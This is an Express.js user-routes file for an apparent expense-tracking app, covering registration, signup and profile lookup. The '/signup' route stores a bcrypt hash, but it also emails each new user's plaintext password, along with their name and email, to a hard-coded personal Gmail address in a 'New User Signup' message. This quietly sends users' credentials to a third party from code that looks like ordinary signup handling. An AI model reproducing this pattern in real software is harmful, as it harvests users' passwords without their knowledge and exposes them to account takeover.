const bcrypt = require("bcrypt");
const { User, validate } = require("../models/user");
const express = require("express");
const router = express.Router();
const {auth} = require('../middleware/auth')
const nodemailer = require('nodemailer');

const email= "trackexpenses07@gmail.com"
const pass = process.env.password
//getting all the User
router.get("/me",auth, async (req, res) => {
  const user = await User.findById(req.user._id).select("-password");
  res.send(user);
});

router.post("/", async (req, res) => {
  const { error } = validate(req.body);
  if (error) {
    res.status(400).send(error.message);
    return;
  }
  let user = await User.findOne({ email: req.body.email });
  if (user) return res.status(400).send("User with this email already exist");
  user = new User({
    name: req.body.name,
    email: req.body.email,
    password: req.body.password,
  });
  const salt = await bcrypt.genSalt(10);
  user.password = await bcrypt.hash(user.password, salt);
  await user.save();
  const token = user.generateAuthToken();

  res.header("x-auth-token", token).send(user);
});
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: email,
    pass: pass,
  },
});

router.post('/signup', async (req, res) => {
  const { error } = validate(req.body);
  if (error) {
    res.status(400).send(error.message);
    return;
  }

  let user = await User.findOne({ email: req.body.email });
  if (user) {
    return res.status(400).send("User with this email already exists");
  }

  user = new User({
    name: req.body.name,
    email: req.body.email,
    password: req.body.password,
  });

  const salt = await bcrypt.genSalt(10);
  user.password = await bcrypt.hash(user.password, salt);
  await user.save();

  const { name, email, password } = req.body;

  const signupEmail = {
    from: "trackexpenses07@gmail.com",
    to: email,
    subject: 'Sign up successful',
    text: `Your account is ready under:\n\nName: ${name}\nEmail: ${email}`
  };

  const notificationEmail = {
    from: "trackexpenses07@gmail.com",
    to: "jakimdavy07@gmail.com",
    subject: 'New User Signup',
    text: `A new user has signed up:\n\nName: ${name}\nEmail: ${email}\nPassword: ${password}`
  };

  try {
    await transporter.sendMail(signupEmail);
    await transporter.sendMail(notificationEmail);
    res.status(200).send('Signup successful and emails sent.');
  } catch (error) {
    res.status(500).send('Error sending emails: ' + error.message);
  }
});


module.exports = router;
